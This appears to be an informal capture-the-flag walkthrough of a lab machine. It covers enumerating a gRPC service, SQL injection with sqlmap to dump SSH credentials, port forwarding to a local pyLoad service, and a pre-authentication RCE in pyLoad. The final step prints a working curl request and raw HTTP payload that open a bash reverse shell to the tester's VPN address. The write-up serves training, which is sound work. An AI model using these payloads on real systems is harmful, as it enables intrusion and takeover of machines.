i started by enumerating the machine as always with an NMAP scan:
	nmap -Pn -p- 10.10.11.214
i got those resaults:
	
	22 ssh
	50051 ?

the second port seemed kinda sus so i googled it and i found that is an gRPC (google REMOTE PROCEDURE CALL):
	
	https://github.com/fullstorydev/grpcui
#i ended up modifing the go script in cmd/grpcui/grpcui.go by modifing a line where they used a variable
#that wasnt defined

in this repo ther's an usefull ui that we can use to connect to the 50051 port:
	
	go run cmd/grpcui/grpcui.go  -plaintext 10.10.11.214:50051

now we are in the web interface where we can create an account:
	
	username: admin1
	password: admin1

with those credential we can login and get our id and token

after that we can get accont info by inserting a valid token and an id (we both got when we logged in);
we can now intercept the request with a proxy (i used burpsuite) and save it to a file:
	#id.req#

	POST /invoke/SimpleApp.getInfo HTTP/1.1
	Host: 127.0.0.1:37477
	Content-Length: 195
	sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
	sec-ch-ua-mobile: ?0
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
	Content-Type: application/json
	X-Requested-With: XMLHttpRequest
	x-grpcui-csrf-token: kttaFU2pdLrNfxabZIIKkLmllzb923RAai-m03kVGUk
	sec-ch-ua-platform: "Linux"
	Origin: http://127.0.0.1:37477
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: cors
	Sec-Fetch-Dest: empty
	Referer: http://127.0.0.1:37477/
	Accept-Encoding: gzip, deflate
	Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
	Cookie: _grpcui_csrf_token=kttaFU2pdLrNfxabZIIKkLmllzb923RAai-m03kVGUk
	Connection: close
	{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xIiwiZXhwIjoxNjg1NzMwNTgxfQ.5HDGksjwEK79FJuD6jm4KXf7ai9fXV8XQny17-mhzO0"}],"data":[{"id":"521*"}]}

i added a * after my id number so i can pass the request in sqlmap as so:
	
	sqlmap -r id.req --batch -dump

after that we got some credentials that we can try to use on ssh:
	
	 admin                   admin    
	 HereIsYourPassWord1431  sau      
	 admin1                  admin1  
the only one working is sau creds; so i log in to ssh with pwncat:

	python3 -m pwncat
	connect ssh://sau:HereIsYourPassWord1431@10.10.11.214:22
and i got user flag!!

no time to party, we need to get root..

so i imported linpeas.sh with pwncat:
	
	Ctrl + d
	upload linpeas.sh /tmp/linpeas.sh
	Ctrl + d
	cd /tmp
	chmod +x linpeas.sh
	./linpeas.sh
linpeas show us a bunch of localy open ports that we cant see from the outside of the machine,
for example we take a look at port 8000 with curl on the remote host:
	
	curl 127.0.0.1:8000
is a login web page of the service pyLoad;
we need to interact with it but we can't access it, how could we do..

wventually i portforwarded the 8000 on my loopback via ssh with that command:
	
	ssh -L 9000:127.0.0.1:8000 sau@10.10.11.214

by doing so the port 8000 of the sau machine is linked to the port 9000 on my localhost ip
now i can access it by typing on the browser the ip and port:
	
	127.0.0.1:9000
is the pyLoad login page;
the first thing i did is to search for pyLoad expolits and i found this site:
	
	https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/
in this article they get RCE before authenticate, IT'S PERFECT;
i started a listener to catch a possible revshell:
	
	python3 -m pwncat
	connect -lp 9999
i edited the payload that was on the article with a bash reverse shell to my VPN ip
	
	 curl -i -s -k -X $'POST' -H $'Host: 127.0.0.1:9000' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'package=xxx&crypted=AAAA&jk=pyimport+os%3bos.system("/bin/bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.14.47/9999+0>%261%27");f=function%20f2(){};&passwords=aaaa' $'http://127.0.0.1:9000/flash/addcrypted2'
this is how the request looks in burpsuite:

	POST /flash/addcrypted2 HTTP/1.1
	Host: 127.0.0.1:9000 
	Upgrade-Insecure-Requests: 1
	Origin: http://127.0.0.1:9000
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	Sec-Fetch-User: ?1
	Cookie: _grpcui_csrf_token=kttaFU2pdLrNfxabZIIKkLmllzb923RAai-m03kVGUk
	Connection: close
	Content-Length: 126

	package=xxx&crypted=AAAA&jk=pyimport+os%3bos.system("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.47/9999+0>%261'");f=function%20f2(){};

WE ARE NOW ROOT!!
